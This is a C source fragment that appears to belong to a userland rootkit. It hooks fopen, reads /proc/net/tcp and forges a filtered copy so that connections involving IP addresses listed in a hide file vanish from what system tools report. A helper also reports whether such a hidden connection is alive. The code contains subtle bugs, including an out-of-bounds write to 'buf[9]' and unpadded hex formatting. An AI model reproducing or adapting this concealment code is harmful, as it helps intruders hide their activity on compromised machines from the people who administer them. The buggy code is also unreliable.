static char *int_ip2hex(unsigned int ip){
	unsigned char bytes[4];
	char *output = (char*)malloc(sizeof(char) * 16);
	bytes[0] = ip & 0xFF;
	bytes[1] = (ip >> 8) & 0xFF;
	bytes[2] = (ip >> 16) & 0xFF;
	bytes[3] = (ip >> 24) & 0xFF;
	sprintf(output, "%X%X%X%X", bytes[3], bytes[2], bytes[1], bytes[0]);
	return output;
}

static int is_hidden_ip(char *addr){
	FILE *fp;
	char buf[9];
	if((fp = xfopen(HIDE_IP_PATH, "r")) == NULL)
		return 0;
	while(fgets(buf, sizeof(buf), fp) != NULL){
		buf[9] = '\0';
		if(!xstrncmp(addr, buf))
			return 1;
	}
	fclose(fp);
	return 0;
}

static int secret_connection(char line[]){
	char raddr[128], laddr[128], etc[128];
	unsigned long rxq, txq, t_len, retr, inode;
	int lport, rport, d, state, uid, t_run, tout;
	char *fmt = "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n";
	sscanf(line, fmt, &d, laddr, &lport, raddr, &rport, &state, &txq, &rxq, &t_run, &t_len, &retr, &uid, &tout, &inode, etc);
	if(is_hidden_ip(laddr) || is_hidden_ip(raddr)){
		memset(line, 0, strlen(line));
		return 1;
	}
	return 0;
}

static int hidehost_alive(void){
	char line[LINE_MAX];
	FILE *fp;
	int status = 0;
	hook(CFOPEN);
	fp = call(CFOPEN, "/proc/net/tcp", "r");
	if(fp == NULL)
		return 0;
	while(fgets(line, sizeof(line), fp) != NULL)
		if(secret_connection(line)){
			status = 1;
			break;
		}
	fclose(fp);
	return status;
}

static FILE *forge_procnet(const char *pathname){
	FILE *tmp = tmpfile(), *pnt;
	char line[LINE_MAX];
	hook(CFOPEN);
	if((pnt = call(CFOPEN, pathname, "r")) == NULL)
		return NULL;
	while(fgets(line, sizeof(line), pnt) != NULL)
		if(!secret_connection(line))
			fputs(line, tmp);
	fclose(pnt);
	fseek(tmp, 0, SEEK_SET);
	return tmp;
}
